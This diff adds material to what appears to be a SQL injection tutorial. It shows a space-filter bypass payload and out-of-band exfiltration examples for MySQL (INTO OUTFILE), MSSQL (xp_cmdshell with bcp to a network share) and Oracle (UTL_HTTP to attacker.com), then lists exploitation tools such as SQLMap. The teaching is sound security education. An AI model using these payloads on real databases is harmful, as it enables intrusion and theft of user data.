@@ -41,3 +41,50 @@ When spaces are not allowed or are filtered out, various techniques can be used 
     The SQL query shows that the spaces are being omitted by code. To bypass these protections, we can use URL-encoded characters that represent different types of whitespace or line breaks, such as %09 (horizontal tab), %0A (line feed). These characters can replace spaces and still be interpreted correctly by the SQL parser.
 
 The original payload 1' OR 1=1 -- can be modified to use newline characters instead of spaces, resulting in the payload 1'%0A||%0A1=1%0A--%27+. This payload constructs the same logical condition as 1' OR 1=1 -- but uses newline characters to bypass the space filter.
+
+Techniques in Different Databases
+
+Out-of-band SQL injection attacks utilise the methodology of writing to another communication channel through a crafted query. This technique is effective for exfiltrating data or performing malicious actions when direct interaction with the database is restricted. There are multiple commands within a database that may allow exfiltration, but below is a list of the most commonly used in various database systems:
+
+MySQL and MariaDB
+
+In MySQL or MariaDB, Out-of-band SQL injection can be achieved using SELECT ... INTO OUTFILE or load_file command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:
+
+ 
+SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
+
+        
+
+An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.
+
+Microsoft SQL Server (MSSQL)
+
+In MSSQL, Out-of-band SQL injection can be performed using features like xp_cmdshell, which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:
+
+ 
+EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
+
+        
+
+Alternatively, OPENROWSET or BULK INSERT can be used to interact with external data sources, facilitating data exfiltration through OOB channels.
+
+Oracle
+
+In Oracle databases, Out-of-band SQL injection can be executed using the UTL_HTTP or UTL_FILE packages. For instance, the UTL_HTTP package can be used to send HTTP requests with sensitive data:
+
+ 
+DECLARE
+  req UTL_HTTP.REQ;
+  resp UTL_HTTP.RESP;
+BEGIN
+  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
+  UTL_HTTP.GET_RESPONSE(req);
+END;
+
+        
+
+
+SQLMap: SQLMap is an open-source tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the tool here.
+SQLNinja: SQLNinja is a tool specifically designed to exploit SQL Injection vulnerabilities in web applications that use Microsoft SQL Server as the backend database. It automates various stages of exploitation, including database fingerprinting and data extraction. 
+JSQL Injection: A Java library focused on detecting SQL injection vulnerabilities within Java applications. It supports various types of SQL Injection attacks and provides a range of options for extracting data and taking control of the database.
+BBQSQL: BBQSQL is a Blind SQL Injection exploitation framework designed to be simple and highly effective for automated exploitation of Blind SQL Injection vulnerabilities.
